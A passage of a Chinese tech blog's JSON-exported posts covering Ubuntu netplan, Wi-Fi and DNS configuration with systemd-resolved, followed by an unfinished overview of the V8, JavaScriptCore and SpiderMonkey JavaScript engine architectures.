class=\"line\">    Docs: man:systemd-resolved.service(8)</span><br><span class=\"line\">        https://www.freedesktop.org/wiki/Software/systemd/resolved</span><br><span class=\"line\">        https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-managers</span><br><span class=\"line\">        https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:/# ls -l /etc/resolv.conf</span><br><span class=\"line\">lrwxrwxrwx 1 root root 39 Feb  3 18:22 /etc/resolv.conf -&gt; ../run/systemd/resolve/stub-resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:/# rm /etc/resolv.conf</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重新创建文件<code>/etc/resolv.conf</code>，并写入自定义的nameserver</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# cat /etc/resolv.conf</span><br><span class=\"line\">nameserver 192.168.0.1</span><br><span class=\"line\">nameserver 8.8.8.8</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>简单用<code>dig</code>测试一下，DNS现在正常工作了。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# dig t.cn</span><br><span class=\"line\"></span><br><span class=\"line\">; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.11-Ubuntu &lt;&lt;&gt;&gt; t.cn</span><br><span class=\"line\">;; global options: +cmd</span><br><span class=\"line\">;; Got answer:</span><br><span class=\"line\">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 22813</span><br><span class=\"line\">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class=\"line\"></span><br><span class=\"line\">;; OPT PSEUDOSECTION:</span><br><span class=\"line\">; EDNS: version: 0, flags:; udp: 512</span><br><span class=\"line\">;; QUESTION SECTION:</span><br><span class=\"line\">;t.cn.    IN  A</span><br><span class=\"line\"></span><br><span class=\"line\">;; ANSWER SECTION:</span><br><span class=\"line\">t.cn.    59  IN  A  116.211.169.137</span><br><span class=\"line\"></span><br><span class=\"line\">;; Query time: 197 msec</span><br><span class=\"line\">;; SERVER: 8.8.8.8#53(8.8.8.8)</span><br><span class=\"line\">;; WHEN: Sat Jun 20 13:05:06 UTC 2020</span><br><span class=\"line\">;; MSG SIZE  rcvd: 49</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Step-5-设置Wifi网络接入（可选）\"><a href=\"#Step-5-设置Wifi网络接入（可选）\" class=\"headerlink\" title=\"Step 5: 设置Wifi网络接入（可选）\"></a>Step 5: 设置Wifi网络接入（可选）</h2><ol>\n<li><p>在确认已连接公网、且<strong>DNS正常工作</strong>的前提下，在线安装<code>network-manager</code>（其中包括了无线网卡驱动程序等必需的软件包）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">apt update</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">apt install network-manager</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：如果有线网卡没有配置nameserver，而且缺少上一步强行设置nameserver的情况下，由于不能正确解析公网域名，apt无法工作！！！</p>\n</blockquote>\n</li>\n<li><p>再次编辑<code>/etc/netplan/50-cloud-init.yaml</code>，至少需要配置<code>Access-points</code>的SSID和接入密码等。<br>注意：必须显示定义渲染方式为<code>NetworkManager</code>，这也是上一步需要apt安装的原因。</p>\n <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># This file is generated from information provided by the datasource.  Changes</span></span><br><span class=\"line\"><span class=\"comment\"># to it will not persist across an instance reboot.  To disable cloud-init&#x27;s</span></span><br><span class=\"line\"><span class=\"comment\"># network configuration capabilities, write a file</span></span><br><span class=\"line\"><span class=\"comment\"># /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:</span></span><br><span class=\"line\"><span class=\"comment\"># network: &#123;config: disabled&#125;</span></span><br><span class=\"line\"><span class=\"attr\">network:</span></span><br><span class=\"line\">    <span class=\"attr\">version:</span> <span class=\"number\">2</span></span><br><span class=\"line\">    <span class=\"attr\">renderer:</span> <span class=\"string\">NetworkManager</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">ethernets:</span></span><br><span class=\"line\">        <span class=\"attr\">enp0s25:</span></span><br><span class=\"line\">            <span class=\"attr\">dhcp4:</span> <span class=\"literal\">no</span></span><br><span class=\"line\">            <span class=\"attr\">addresses:</span> [<span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.130</span><span class=\"string\">/24</span>]</span><br><span class=\"line\">            <span class=\"attr\">gateway4:</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attr\">wifis:</span></span><br><span class=\"line\">        <span class=\"attr\">wlp2s0:</span></span><br><span class=\"line\">            <span class=\"attr\">access-points:</span></span><br><span class=\"line\">                <span class=\"attr\">&quot;NETGEAR59&quot;:</span></span><br><span class=\"line\">                    <span class=\"attr\">password:</span> <span class=\"string\">&quot;xxxxxxxx&quot;</span></span><br><span class=\"line\">            <span class=\"attr\">dhcp4:</span> <span class=\"literal\">no</span></span><br><span class=\"line\">            <span class=\"attr\">addresses:</span> [<span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.131</span><span class=\"string\">/24</span>]</span><br><span class=\"line\">            <span class=\"attr\">gateway4:</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>再次<code>netplan generate</code>检查并刷新网络配置，<code>netplan apply</code>启动无线网卡。<br>检查网络状态，<code>ifconfig</code>确认无线网卡<code>wlp2s0</code>启动成功<br>注意：<code>netplan</code>有中间配置文件的刷新机制，generate + apply是一个良好的操作习惯。</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:/etc/netplan# netplan generate</span><br><span class=\"line\">root@nuc5i3:/etc/netplan# netplan apply</span><br><span class=\"line\">root@nuc5i3:/etc# ifconfig</span><br><span class=\"line\">......</span><br><span class=\"line\">wlp2s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class=\"line\">        inet 192.168.0.131  netmask 255.255.255.0  broadcast 192.168.0.255</span><br><span class=\"line\">        inet6 fe80::3613:e8ff:fe25:20d8  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class=\"line\">        ether 34:13:e8:25:20:d8  txqueuelen 1000  (Ethernet)</span><br><span class=\"line\">        RX packets 501  bytes 94281 (94.2 KB)</span><br><span class=\"line\">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class=\"line\">        TX packets 44  bytes 4436 (4.4 KB)</span><br><span class=\"line\">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure></li>\n</ol>\n<hr>\n<h2 id=\"附录：-如何查看网卡的逻辑设备名\"><a href=\"#附录：-如何查看网卡的逻辑设备名\" class=\"headerlink\" title=\"附录： 如何查看网卡的逻辑设备名\"></a>附录： 如何查看网卡的逻辑设备名</h2><p>不同型号的硬件设备，由于其驱动程序的差异，在Ubuntu安装完成后会有不同的设备名。</p>\n<p>使用<code>lshw</code>命令，可以查询全部硬件设备信息，并找到其逻辑设备名。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">lshw</span></span><br><span class=\"line\">nuc5i3</span><br><span class=\"line\">    description: Desktop Computer</span><br><span class=\"line\">    width: 64 bits</span><br><span class=\"line\">    capabilities: smbios-2.8 dmi-2.8 smp vsyscall32</span><br><span class=\"line\">    configuration: boot=normal chassis=desktop uuid=00EC2C62-7872-E311-B04F-B8AEED7387FB</span><br><span class=\"line\">......</span><br><span class=\"line\">        *-network</span><br><span class=\"line\">             description: Ethernet interface</span><br><span class=\"line\">             product: Ethernet Connection (3) I218-V</span><br><span class=\"line\">             vendor: Intel Corporation</span><br><span class=\"line\">             physical id: 19</span><br><span class=\"line\">             bus info: pci@0000:00:19.0</span><br><span class=\"line\">             logical name: enp0s25</span><br><span class=\"line\">             version: 03</span><br><span class=\"line\">             serial: b8:ae:ed:73:87:fb</span><br><span class=\"line\">             size: 100Mbit/s</span><br><span class=\"line\">             capacity: 1Gbit/s</span><br><span class=\"line\">             width: 32 bits</span><br><span class=\"line\">             clock: 33MHz</span><br><span class=\"line\">......</span><br><span class=\"line\">        *-network</span><br><span class=\"line\">            description: Wireless interface</span><br><span class=\"line\">            product: Wireless 7265</span><br><span class=\"line\">            vendor: Intel Corporation</span><br><span class=\"line\">            physical id: 0</span><br><span class=\"line\">            bus info: pci@0000:02:00.0</span><br><span class=\"line\">            logical name: wlp2s0</span><br><span class=\"line\">            version: 59</span><br><span class=\"line\">            serial: 34:13:e8:25:20:d8</span><br><span class=\"line\">            width: 64 bits</span><br><span class=\"line\">            clock: 33MHz</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>还有一个办法，就是命令<code>ip a</code>查看网卡的简要信息。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:~# ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: enp0s25: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class=\"line\">    link/ether b8:ae:ed:73:87:fb brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.0.130/24 brd 192.168.0.255 scope global enp0s25</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 fe80::baae:edff:fe73:87fb/64 scope link</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">3: wlp2s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN group default qlen 1000</span><br><span class=\"line\">    link/ether 34:13:e8:25:20:d8 brd ff:ff:ff:ff:ff:ff</span><br></pre></td></tr></table></figure>\n"},{"title":"Ubuntu的DNS服务","url":"/2020/06/20/Ubuntu%E7%9A%84DNS%E6%9C%8D%E5%8A%A1/","content":"<h2 id=\"DNS概述\"><a href=\"#DNS概述\" class=\"headerlink\" title=\"DNS概述\"></a>DNS概述</h2><p>DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。</p>\n<p>DNS服务是一件很复杂的事情，有很多不同来源的设置途径相互影响，主要包括：</p>\n<ul>\n<li>全局配置文件: <code>/etc/systemd/resolved.conf</code></li>\n<li>单个连接的静态配置文件：通过<code>/etc/netplan/*.yaml</code>对单个网卡配置nameserver，还有<code>/etc/systemd/network/*.network</code>???</li>\n<li>单个连接的动态配置 :从DHCP默认网关或其他系统服务得到的DNS设置</li>\n</ul>\n<p>请看官方文档的解释：</p>\n<p>systemd-resolved 为本地应用程序提供了网络名字解析服务。 它不但提供了传统的 DNS&#x2F;DNSSEC 解析与本地缓存功能，还提供了 LLMNR 与 MulticastDNS 的解析(resolver)与应答(responder)的功能。 本地应用程序可以通过三种方式提交网络名字解析请求：</p>\n<p>第一种，通过D-Bus总线上的本地全功能API systemd-resolved (详见 API Documentation)。 这是首选方法，因为它是异步的并且功能最全。 此种方式可以正确返回 DNSSEC 的有效状态，以及支持 link-local 网络所必需的地址的网口范围(interface scope)。</p>\n<p>第二种，通过 glibc 的 getaddrinfo(3), gethostbyname(3) 等相关API(RFC3493)。 这些API受到了广泛的支持(包括非Linux平台)。此种方法不能检查 DNSSEC 的有效状态，并且是同步的。 此种方法由 glibc Name Service Switch (nss(5)) 支持。 必须使用 glibc NSS 模块 nss-resolve(8) 才能让 glibc NSS 使用 systemd-resolved 提供的名字解析功能。</p>\n<p>第三种，通过 systemd-resolved 在本地回环网口 127.0.0.53 上提供的本地DNS服务器。 应用程序可以直接向 127.0.0.53 发送DNS请求，从而直接使用 systemd-resolved 提供的解析服务。 除非确实无法使用前面的 glibc NSS 或 D-Bus API 两种方法， 否则应该尽量避免使用此种方式， 因为无法将各种网络解析功能(例如 link-local 地址或 LLMNR Unicode 域名)全部映射到 单播DNS协议中。</p>\n<h2 id=\"DNS的解析顺序\"><a href=\"#DNS的解析顺序\" class=\"headerlink\" title=\"DNS的解析顺序\"></a>DNS的解析顺序</h2><img src=\"/2020/06/20/Ubuntu%E7%9A%84DNS%E6%9C%8D%E5%8A%A1/dns.jpg\" class=\"\">\n\n<ol>\n<li><p>操作系统会先检查自己<code>本地hosts</code>文件是否有这个网址映射关系，如果有，就先调用这个IP地址映射，完成域名解析。</p>\n</li>\n<li><p>如果hosts里没有这个域名的映射，则查找本地DNS解析器缓存，是否有这个网址映射关系，如果有，直接返回，完成域名解析。</p>\n</li>\n<li><p>如果hosts与本地DNS解析器缓存都没有相应的网址映射关系，首先会找TCP&#x2F;ip参数中设置的<code>首选DNS服务器</code>，在此我们叫它本地DNS服务器，此服务器收到查询时，如果要查询的域名，包含在本地配置区域资源中，则返回解析结果给客户机，完成域名解析，此解析具有权威性。</p>\n</li>\n<li><p>如果要查询的域名，不由本地DNS服务器区域解析，但该服务器已缓存了此网址映射关系，则调用这个IP地址映射，完成域名解析，此解析不具有权威性。</p>\n</li>\n<li><p>如果本地DNS服务器本地区域文件与缓存解析都失效，则根据本地DNS服务器的设置（是否设置转发器）进行查询.</p>\n<ul>\n<li><p>如果未用转发模式，本地DNS就把请求发至<code>13台根DNS</code>，根DNS服务器收到请求后会判断这个域名(.com)是谁来授权管理，并会返回一个负责该顶级域名服务器的一个IP。本地DNS服务器收到IP信息后，将会联系负责.com域的这台服务器。这台负责.com域的服务器收到请求后，如果自己无法解析，它就会找一个管理.com域的下一级DNS服务器地址(qq.com)给本地DNS服务器。当本地DNS服务器收到这个地址后，就会找qq.com域服务器，重复上面的动作，进行查询，直至找到<a href=\"http://www.qq.com主机./\">www.qq.com主机。</a></p>\n</li>\n<li><p>如果用的是转发模式，此DNS服务器就会把请求转发至<code>上一级DNS服务器</code>，由上一级服务器进行解析，上一级服务器如果不能解析，或找根DNS或把转请求转至上上级，以此循环。不管是本地DNS服务器用是是转发，还是根提示，最后都是把结果返回给本地DNS服务器，由此DNS服务器再返回给客户机。</p>\n</li>\n</ul>\n</li>\n</ol>\n<p>从客户端到本地DNS服务器是属于递归查询，而DNS服务器之间就是的交互查询就是迭代查询。</p>\n<h2 id=\"如何配置-etc-resolv-conf\"><a href=\"#如何配置-etc-resolv-conf\" class=\"headerlink\" title=\"如何配置&#x2F;etc&#x2F;resolv.conf\"></a>如何配置&#x2F;etc&#x2F;resolv.conf</h2><p>在DNS设置中，最重要的配置文件就是<code>/etc/resolv.conf</code>，其中的关键字主要有四个，每行以一个关键字开头，后接一个或多个由空格隔开的参数，分别是：</p>\n<ul>\n<li><code>nameserver</code>  ：表示解析域名时使用该地址指定的主机为域名服务器。其中域名服务器是按照文件中出现的顺序来查询的,且只有当第一个nameserver没有反应时才查询下面的nameserver。</li>\n<li><code>domain</code>      ：声明主机的域名。很多程序用到它，如邮件系统；当为没有域名的主机进行DNS查询时，也要用到。如果没有域名，主机名将被使用，删除所有在第一个点( .)前面的内容。</li>\n<li><code>search</code>      ：它的多个参数指明域名查询顺序。当要查询没有域名的主机，主机将在由search声明的域中分别查找。<br>domain和search不能共存；如果同时存在，后面出现的将会被使用。</li>\n<li><code>sortlist</code>    ：允许将得到域名结果进行特定的排序。它的参数为网络&#x2F;掩码对，允许任意的排列顺序。</li>\n</ul>\n<p>下面我们给出一个&#x2F;etc&#x2F;resolv.conf的示例：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">domain  51osos.com</span><br><span class=\"line\">search  www.51osos.com  51osos.com</span><br><span class=\"line\">nameserver 202.102.192.68</span><br><span class=\"line\">nameserver 202.102.192.69</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Ubuntu-DNS设置的注意事项\"><a href=\"#Ubuntu-DNS设置的注意事项\" class=\"headerlink\" title=\"Ubuntu DNS设置的注意事项\"></a>Ubuntu DNS设置的注意事项</h2><p>在无网络条件下安装ubuntu，系统将自启动并运行<code>systemd-resolved</code>服务，在<code>127.0.0.53:53</code>保持侦听并提供DNS解析服务。<br>注意：Ubuntu将<code>/etc/resolv.conf</code>设置为软连接，并指向<code>/run/systemd/resolve/stub-resolv.conf</code>，其配置信息为：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@nuc5i3:/etc# ls -l resolv.conf</span><br><span class=\"line\">lrwxrwxrwx 1 root root 39 Feb  3 18:22 resolv.conf -&gt; ../run/systemd/resolve/stub-resolv.conf</span><br><span class=\"line\"></span><br><span class=\"line\">root@nuc5i3:/etc# cat resolv.conf</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">This file is managed by man:systemd-resolved(8). Do not edit.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># This is a dynamic resolv.conf file for connecting local clients to the</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">internal DNS stub resolver of systemd-resolved. This file lists all</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">configured search domains.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># Run &quot;systemd-resolve --status&quot; to see details about the uplink DNS servers</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">currently <span class=\"keyword\">in</span> use.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># Third party programs must not access this file directly, but only through the</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">symlink at /etc/resolv.conf. To manage man:resolv.conf(5) <span class=\"keyword\">in</span> a different way,</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">replace this symlink by a static file or a different symlink.</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\"><span class=\"comment\"># See man:systemd-resolved.service(8) for details about the supported modes of</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">operation <span class=\"keyword\">for</span> /etc/resolv.conf.</span></span><br><span class=\"line\"></span><br><span class=\"line\">nameserver 127.0.0.53</span><br><span class=\"line\">options edns0</span><br></pre></td></tr></table></figure>\n\n<hr>\n<p>参考文档：<br><a href=\"http://www.jinbuguo.com/systemd/systemd-resolved.service.html\">systemd-resolved.service 中文手册</a><br><a href=\"https://www.jianshu.com/p/590a8dfdf9a9\">搭建Kubernetes集群时DNS无法解析问题的处理过程</a><br><a href=\"https://www.jianshu.com/p/c1ccc5db1762\">ubuntu的DNS配置和管理</a><br><a href=\"https://www.cnblogs.com/marklove/p/9196045.html\">Ubuntu 18.04设置dns</a></p>\n"},{"title":"V8引擎技术简介","url":"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>2009年，Google启动了浏览器项目，V8引擎诞生的使命就是性能的极致，Google觉得这这种架构生成字节码会浪费时间，决定<strong>一步到位直接采用机器码</strong>。</p>\n<p>早期V8引擎包含了<code>Full-Codegen</code>和 <code>Crankshaft</code>(曲轴) 两个编译器，即：JS源代码会被V8引擎进行两次解析，第一次使用<code>Full-Codegen</code>进行快速编译，而第二次使用<code>Crankshaft</code>进行深度优化编译，其基本处理流程为：</p>\n<ol>\n<li>将js源代码转化成AST（抽象语法树）。</li>\n<li>通过<code>Full-Codegen</code>引擎编译AST变成<strong>基准的机器码</strong>，然后直接执行这些未经优化的二进制文件。</li>\n<li>在执行机器码的过程中，通过内置的<code>Profiler</code>分析器筛选出热点函数，将标记的代码通过<code>Crankshaft</code>引擎进行优化编译生成<strong>优化的机器码</strong>。</li>\n<li>再次运行到这个Javascript函数时，直接使用缓存中<strong>优化的机器码</strong>。</li>\n</ol>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/v8-arch-0.png\" class=\"\">\n\n<p>通过取消字节码环节，V8引擎的运行速度有了明显的提示，但随着Web网页的复杂性，尤其是在智能终端上的应用普及，这种架构也暴露了不少严重的缺陷：</p>\n<ul>\n<li><strong>内存占用过高</strong>：Full-Codegen生成机器码会占用大量内存，一个1M左右的JS源码文件通过编译生成的机器码通常达到10M+，而早期手机内存普遍有限，过度占用会导致性能大大降低</li>\n<li><strong>启动速度较慢</strong>：Full-Codegen编译直接生成机器码，需要较长的编译时间，导致应用启动的速度受到较大影响</li>\n<li><strong>跨平台支持难</strong>：Crankshaft直接生成机器码，需要自行适配不同的CPU架构，难以适应手机终端的复杂性</li>\n</ul>\n<p>上述架构问题的集中体现，就是2016年<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=593477\">Facebook报告的Chrome代码缓存失效Bug</a>。</p>\n<blockquote>\n<p>当时的Chrome浏览器重复加载Facebook主页，第一次加载时长165ms，但重复加载时发现时长几乎没有变化，说明真正耗时高的js代码并没有被缓存和优化。<br>导致该Bug的原因：为缓解二进制代码占用内存空间大的矛盾，V8采取了<strong>惰性编译</strong>的优化原则（即只对最外层的代码进行优化编译），而Facebook首页采用的<strong>IIFE</strong>（立即调用函数表达式，类似于闭包函数）代码封装方式，导致浏览器并未对IIFE函数的内部关键代码进行优化。</p>\n</blockquote>\n<h2 id=\"一、V8引擎的技术架构-字节码的回归\"><a href=\"#一、V8引擎的技术架构-字节码的回归\" class=\"headerlink\" title=\"一、V8引擎的技术架构 - 字节码的回归\"></a>一、V8引擎的技术架构 - 字节码的回归</h2><p>2017年，Google发布了V8 5.9版本，完全废弃并移除了<code>full-codegen</code>和 <code>Crankshaft</code>，新增了 <code>Ignition</code>（点火器）字节码解释器和<code>Turbofan</code>（涡轮风扇）优化编译器，标志着字节码技术的全面回归。</p>\n<ul>\n<li><code>Ignition</code>：本质上就是一个类似于Java中的JVM虚拟机，负责将AST编译成字节码，并逐句进行解释形成二进制代码并执行。</li>\n<li><code>Turbofan</code>：在解释执行的过程中，<code>Ignition</code>标记重复执行的热点代码，将相应的字节码提交给<code>Turbofan</code>，编译生成优化的机器码并缓存，今后再次运行到这个函数时便只执行机器码而非字节码</li>\n</ul>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/v8.jpg\" class=\"\">\n\n<p>也就是说，JS脚本有三种不同的启动方式：</p>\n<ul>\n<li><code>Cold load</code>冷启动: 首次加载脚本文件时，<code>Ignition</code>编译生成字节码文件并解释执行，没有任何数据缓存</li>\n<li><code>Warm load</code>暖启动：如果V8发现第二次使用了相同的脚本文件，将提交给<code>Turbofan</code>编译生成机器码文件，并与脚本文件一起加载到磁盘缓存中</li>\n<li><code>Hot load</code>热启动: 如果第三次加载相同的脚本文件，V8可以从磁盘缓存中载入脚本，并直接执行对应的机器码文件</li>\n</ul>\n<blockquote>\n<p>js文件加载的过程并不是由V8负责的，它可能来自于网络请求、本地的cache或者是也可以是来自service worker，浏览器的js加载过程是V8引擎的前置步骤。</p>\n</blockquote>\n<p>通过重新引入字节码技术，原有V8引擎存在的问题有了显著改善，体现在：</p>\n<ol>\n<li>首次启动时只需要编译出字节码，然后逐句执行字节码，编译出字节码的速度可远远快于编译出二进制代码的速度。</li>\n<li>字节码的数据量远远低于机器码，因此内存和磁盘的空间占用大大减少。</li>\n<li><code>Turbofan</code>直接利用<code>Ignition</code>已经生成的字节码进行编译优化，无需源代码的二次解析，代码复杂度和处理效率都有提升</li>\n<li>通过虚拟机和字节码技术适配不同CPU架构体系，引擎代码的复杂度大大降低。</li>\n</ol>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/bytecode.png\" class=\"\">\n\n<h2 id=\"二、JavaScriptCore的技术架构\"><a href=\"#二、JavaScriptCore的技术架构\" class=\"headerlink\" title=\"二、JavaScriptCore的技术架构\"></a>二、JavaScriptCore的技术架构</h2><p>JavaScriptCore（缩写为 JSC），是Apple 的 JavaScript 引擎，被用于 Safari 和 React Native 两个项目中。</p>\n<p>JavaScriptCore有四种不同的代码执行方式：</p>\n<h3 id=\"1-LLInt（Low-Level-Interpreter）-解释器模式\"><a href=\"#1-LLInt（Low-Level-Interpreter）-解释器模式\" class=\"headerlink\" title=\"1. LLInt（Low Level Interpreter）- 解释器模式\"></a>1. <code>LLInt</code>（Low Level Interpreter）- 解释器模式</h3><p><code>LLInt</code>是用跨平台的汇编语言实现的，负责逐条解释执行JSC虚机指令，JS代码的执行总是从LLInt模式开始的。<br>执行 Parser 生成的 Byte code。代码在 <code>llint/</code> 里，使用的汇编语言代码在 <code>offlineasm/</code> 里，可以编译为 x86 和 ARMv7 的汇编和 C 代码。<br><code>LLInt</code> 希望达成除了词法和语法分析外零启动消耗，同时遵守用 JIT 在调用，堆栈和起存器的约定。</p>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/webkit.png\" class=\"\">\n\n<h3 id=\"2-Baseline-基本的实时编译模式\"><a href=\"#2-Baseline-基本的实时编译模式\" class=\"headerlink\" title=\"2. Baseline - 基本的实时编译模式\"></a>2. <code>Baseline</code> - 基本的实时编译模式</h3><p><code>Baseline</code>只是做了简单的“机器码化”，减小了解释器按指令dispatch的开销，代码（指令序列）本身并未做任何优化。<br>在函数调用了6次，或者某段代码循环了大于100次会被触发。<br><code>BaseLine</code> 的代码在 <code>jit</code>&#x2F; 里。BaseLine JIT 还对几乎所有堆的访问执行了复杂的多态内联高速缓存（Polymorphic inline caches）。</p>\n<h3 id=\"3-DFG（Data-Flow-Graph）：低延迟优化的实时编译模式\"><a href=\"#3-DFG（Data-Flow-Graph）：低延迟优化的实时编译模式\" class=\"headerlink\" title=\"3. DFG（Data Flow Graph）：低延迟优化的实时编译模式\"></a>3. <code>DFG（Data Flow Graph）</code>：低延迟优化的实时编译模式</h3><p>如果<code>Baseline</code>性能不足，就用<code>DFG</code>生成更优化的机器码来执行。<br>在函数被调用了60次或者代码循环了1000次会触发。<br><code>DFG</code>会把字节码转成CPS形式（Continuation-Passing Style）后编译成机器码，目的是减少后续生成代码时需添加的类型检查逻辑。<br>编译时计算常量数据，并将它传播到相关代码中，达到整体简化代码的目的。<br>启用了多种常规的编译优化，包括：寄存器分配、控制流图简化、公共子表达式消除、无用代码消除、稀疏有条件的常量传播等。<br><code>DFG</code>代码在 <code>dfg/</code> 里。定期评估优化效果，如果更差性能，将回退到<code>Baseline</code>，看情况再次决定是否调用<code>DFG</code>。</p>\n<h3 id=\"4-FTL（Faster-Than-Light）：高吞吐量优化的实时编译模式\"><a href=\"#4-FTL（Faster-Than-Light）：高吞吐量优化的实时编译模式\" class=\"headerlink\" title=\"4. FTL（Faster Than Light）：高吞吐量优化的实时编译模式\"></a>4. <code>FTL（Faster Than Light）</code>：高吞吐量优化的实时编译模式</h3><p><code>FTL</code>主要是配合后端进行优化，之前是使用的<code>LLVM</code>后端，后来为了减少内存开销，对LLVM进行了裁剪并改名为<code>B3</code>。<br>复用了DFG的大部分流程，将原DFG流程中的DFG后端替换为新的FTL流程，重点优化如下内容：CPS转SSA、SSA转LLVM IR、LLVM IR的编译优化、IR转机器码等。</p>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/jsc-2.png\" class=\"\">\n\n<h2 id=\"三、其它浏览器的技术架构\"><a href=\"#三、其它浏览器的技术架构\" class=\"headerlink\" title=\"三、其它浏览器的技术架构\"></a>三、其它浏览器的技术架构</h2><p><code>SpiderMonkey</code>，是在 Firefox 和 SpiderNode 中使用的 Mozilla 的 JavaScript 引擎，包含了两个优化编译器。<br>&#96;</p>\n<img src=\"/2021/11/05/V8%E5%BC%95%E6%93%8E%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/firefox.jpg\" class=\"\">\n\n<ul>\n<li>解释器将代码解释给<code>Baseline</code>编译器，该编译器可以生成部分优化的代码。</li>\n<li>结合运行代码时收集的分析数据，<code>IonMonkey</code>编译器可以生成高度优化的代码。</li>\n<li>如果尝试优化失败，IonMonkey 将回退到 Baseline 阶段的代码。</li>\n</ul>\n<p><code>Chakra</code>，是用于 Edge 和 